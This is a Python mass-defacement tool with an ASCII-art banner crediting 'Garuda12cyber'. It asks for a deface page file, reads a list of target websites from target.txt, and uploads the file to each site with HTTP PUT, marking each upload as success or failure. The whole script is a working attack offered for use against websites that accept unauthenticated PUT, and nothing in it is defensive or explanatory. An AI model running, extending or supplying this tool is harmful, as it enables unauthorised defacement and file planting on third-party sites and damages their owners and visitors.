#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
       -`                                          `-       
     `+o`                                          `o+`     
    -++o:                                          :o++-    
   -:s:y+.              .-:///::/`                .+y:s:-   
  ./+os/yo-           `-ss/:hhhos`               -oy/so+/.  
  +/so+s+oso-`       `--:sooyhyoh:            `-oso+s+os/+  
 ::s+oso+ooos/-.       .-:-yssssso-         .-/sooo+oso+s:: 
`:s+os++oooo:/oso.:.     `-//+////:     .:.oso/:oooo++so+s:`
.s/oso+o+oo//soo:+oo/.   ://////+//`  ./oo+:oos//oo+o+oso/s.
`+so++soooo-oso::o++os. ./+++++++++: .so++o::oso-oooos++os+`
 +o+osooooo-oos-++osys+-.://://:////-+yyso++-soo-oooooso+o+ 
 /oosooooo+.o++`:/+h+//::::::-ymmhssdNm+h+/:`++o.+ooooosoo/ 
 -osooo++++:+oo/:+/o//:.::.:/-hNo//-/hN/o/+:/oo+:++++oooso- 
 .+osoooooo+-ooo/:++:/:`  `-/-hdo+::/sN:++:/ooo-+ooooooso+. 
  -oooooooooo-/oo+//-//:``.```.--o/omMN-//+oo/-oooooooooo-  
  `:++++++o+o+/:osoo-/////.`.+:.`:ysyhy-ooso:/+o+o++++++:`  
   `:+oosoooooo+::/o:dmhds/`/ss/`.////::o/::+oooooosoo+:`   
     `-/+oo+o++o++/:-hhos/h`..`. /ssso--:/++o++o+oo+/-`     
        -/+++o+++/+//:h+y+yy:.`.+s+os/.//+/+++o+++/-        
           -::/+++//:./osyysys-os+os/..://+++/::-           
             ````.``.-+:ossymh-ooo+:-/-.``.````             
                    :/-/--+ymy-::-.-/-/:                    
        /.         ../-/.`--::::-: ./-/..         ./        
      .-/Ns`       .--.-``---:/---` .`.:.       `sN/-.      
      .yMMMh:s/`  :s-`   /.-::/:-./    .s:  `/s:hMMMy.      
        /mssNNmo/oy..   -o+.-:/-.+o.   ..yo/omNNssm/        
         .:+o/++oyyhs-``y:s:-++::s:s``:hhyso++/o+:.         
             `.:om/syhdhhyysoss+syyddmNys+d/:.`             
                 `-/oss+ooyoMyhososy+yy+:.                  
                     :s:y+s+yo+o+s/s-o:                     
                    .+./:-+`y``y`+.//.+`                    
                           ``  ``                            
Author : Garuda12cyber
github : https://github.com/Garuda12cyber
youtbe : Garuda12cyber
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
